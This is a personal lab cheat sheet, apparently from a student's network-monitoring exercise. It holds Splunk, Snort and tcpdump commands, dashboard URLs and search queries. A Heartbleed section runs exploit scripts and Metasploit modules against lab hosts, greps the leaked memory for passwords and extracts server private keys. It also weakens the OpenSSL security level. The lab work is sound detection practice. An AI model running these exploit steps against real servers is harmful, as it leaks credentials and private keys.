## splunk server start

sudo /home/etudiant/splunk/bin/splunk restart 
sudo /home/etudiant/splunk/bin/splunk start 


## splunk UF start : FW

sudo /opt/splunkforwarder/bin/splunk restart 
sudo /opt/splunkforwarder/bin/splunk stop 


<<< vitrygtr

###### troubleshoot tcadump
ps -aux | grep tcpdump
sudo systemctl stop tcpdump 
sudo systemctl start tcpdump
sudo systemctl status tcpdump

sudo crontab -e  
sudo crontab -l  



## launching dashboards

- home page
http://splunk:8000/fr-FR/app/launcher/home

- TOP DNS QUERIES
http://splunk:8000/fr-FR/app/DNS_Insight/top_queries?earliest=-2m&latest=now&form.src=*&form.dest=*




- snort logs

http://splunk:8000/fr-FR/app/SplunkforSnort/event_search

- snort logs : rapport
- top 10 des signatures :
http://splunk:8000/fr-FR/app/SplunkforSnort/report?s=%2FservicesNS%2Fnobody%2FSplunkforSnort%2Fsaved%2Fsearches%2FTop%252010%2520signatures&sid=admin__nobody__SplunkforSnort__RMD5bd4c9c15bd2e7f88_at_1627208547_2&display.page.search.mode=smart&dispatch.sample_ratio=1&q=search%20sourcetype%3D%22snort%22%20%7C%20top%2010%20name%20%7C%20fields%20-%20percent&earliest=&latest=&display.general.type=statistics

- top 10 des classifications :

http://splunk:8000/fr-FR/app/SplunkforSnort/report?s=%2FservicesNS%2Fnobody%2FSplunkforSnort%2Fsaved%2Fsearches%2FTop%252010%2520classifications&sid=admin__nobody__SplunkforSnort__RMD5b624049bf7eb4301_at_1627208572_3&display.page.search.mode=smart&dispatch.sample_ratio=1&earliest=&latest=&display.general.type=statistics

- top 10 des adresses ip de destination :

http://splunk:8000/fr-FR/app/SplunkforSnort/report?s=%2FservicesNS%2Fnobody%2FSplunkforSnort%2Fsaved%2Fsearches%2FTop%252010%2520destination%2520IPs&sid=admin__nobody__SplunkforSnort__RMD53294bb425a414a5f_at_1627208593_4&display.page.search.mode=smart&dispatch.sample_ratio=1&earliest=&latest=&display.general.type=statistics



- top 10 des adresses ports de destination :


http://splunk:8000/fr-FR/app/SplunkforSnort/report?s=%2FservicesNS%2Fnobody%2FSplunkforSnort%2Fsaved%2Fsearches%2FTop%252010%2520destination%2520ports&sid=admin__nobody__SplunkforSnort__RMD582a572f9f3640ec7_at_1627208633_6&display.page.search.mode=smart&dispatch.sample_ratio=1&earliest=&latest=&display.general.type=statistics


- top 10 des adresses ports source :
http://splunk:8000/fr-FR/app/SplunkforSnort/report?s=%2FservicesNS%2Fnobody%2FSplunkforSnort%2Fsaved%2Fsearches%2FTop%252010%2520source%2520ports&sid=admin__nobody__SplunkforSnort__RMD5009e39aba4ac03b0_at_1627208619_5&display.page.search.mode=smart&dispatch.sample_ratio=1&q=search%20sourcetype%3D%22snort%22%20%7C%20top%2010%20src_port&earliest=&latest=&display.general.type=statistics



- dns insight
http://splunk:8000/fr-FR/app/DNS_Insight/overview?earliest=-30m&latest=now&form.src=*&form.dest=*

## launching snort
<!-- sudo /usr/sbin/snort -A console -i enp0s3 -u snort -c /etc/snort/snort.conf -A full   -->
sudo /usr/sbin/snort -A fast -i enp0s3 -u snort -c /etc/snort/snort.conf 

## launching exploit
à la fois relativement petit et grand


## heartbleed exploit

##### vulnerable server part :
<!-- sudo /home/etudiant/heartbleed-automation/bash/heartbleed-vulnerable-server.sh -->

cd /home/etudiant/heartbleed-automation/bash/heartbleed-example/
sudo docker-compose up -d



##### injection server -- simulate client request
cd /home/etudiant/heartbleed-example 
python stimulate_server.py -a 192.168.1.49



##### pentest server
# execute file
cd /home/etudiant/heartbleed-example
<!-- watch  -->
<!-- sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150 -->
sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150 > /home/etudiant/reject_exploit.log
cat -n /home/etudiant/reject_exploit.log | grep assword | cat -n


################ + d'information décodée
cd /home/etudiant/heartbleed-automation/python/

sudo python exploit.py 192.168.1.49 -p 443 


<!-- watch -n 1 sudo python exploit.py 192.168.1.49 -p 443  
watch -n 1 sudo python /home/etudiant/heartbleed-automation/python/exploit.py 192.168.1.49 -p 443   -->





##### pentest server -- exploit via metasploit
<!-- sudo /home/etudiant/heartbleed-automation/bash/msf/metasploit_heartbleed.sh -->
sudo /home/etudiant/heartbleed-automation/bash/msf/metasploit_heartbleed_loop.sh










#

## dont know





##### vulnerable server part :

<!-- sudo chmod +x ./bash/heartbleed-vulnerable-server.sh && sudo ./bash/heartbleed-vulnerable-server.sh -->


##### injection server -- simulate client request
sudo apt-get update -y && sudo apt-get install -y git python && git clone https://github.com/amineAUPEC/heartbleed-automation.git && cd heartbleed-automation/
cd /home/etudiant && git clone https://github.com/injcristianrojas/heartbleed-example.git
sudo sed -E -i 's/CipherString = DEFAULT@SECLEVEL=2/CipherString = DEFAULT@SECLEVEL=1/' /etc/ssl/openssl.cnf

################ + d'information décodée
cd /home/etudiant/heartbleed-automation/python/ && chmod +x exploit.python
watch -n 1 sudo python exploit.py 192.168.1.173 -p 443  

##### pentest server
cd /home/etudiant/heartbleed-automation/ 



#### set IP
nano ./conffiles/hostlist.txt 
<!-- && nano ./bash/heartbleed-vulnerable-pentest.sh -->
## execute file
<!-- sudo ./bash/heartbleed-vulnerable-pentest.sh -->


##### vulnerable server via BWAPP Docker container
sudo hostnamectl set-hostname bwapp
sudo chmod +x ./bash/install-docker.sh && sudo ./bash/install-docker.sh
sudo docker run -d -p 80:80 -p 8443:8443 raesene/bwapp && ip a



##### exploit via metasploit for private KEYS

cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed_keys.sh && sudo ./metasploit_heartbleed_keys.sh

- verify on server:
  - connect to the container
   dockerps_id=$(sudo docker ps | grep heartbleed | tr -s ' ' | cut -f 1 -d ' ') 
   dockerps_id=$(sudo docker exec -it $dockerps_id bash) 

watch /etc/apache2/ssl/apache.key

watch 'cat /etc/apache2/ssl/apache.key; cat /etc/apache2/ssl/apache.crt'


##### exploit via metasploit

sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 

cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed.sh
## LIST OF OPTIONS for COMMANDS SPLUNK

earliest=-15m 

####  LIST OF COMMANDS SPLUNK
tcpdump
* host=firewall sourcetype="port53tttt" source="/var/log/tcpdump.log"
tcpdump DNS 
* host=firewall sourcetype="port53tttt" source="/var/log/tcpdump.log" *.53


tcpdump PORT 80 HTTP
* host=firewall sourcetype="port53tttt" source="/var/log/tcpdump.log" *.80
tcpdump PORT 443 HTTPS
* host=firewall sourcetype="port53tttt" source="/var/log/tcpdump.log" *.443
tcpdump HTTPS IPV6 UDP
* host=firewall sourcetype="port53tttt" source="/var/log/tcpdump.log" UDP
* 
tcpdump HTTPS IPV6 TCP  Win ack
* host=firewall sourcetype="port53tttt" source="/var/log/tcpdump.log" win OR ack

DNS QUERY
* sourcetype=tshark:port53 OR sourcetype=port53tttt src=* dest=*| fields dns_len query length reply_code Len message_type record_type transport | search message_type=QUERY 
| table *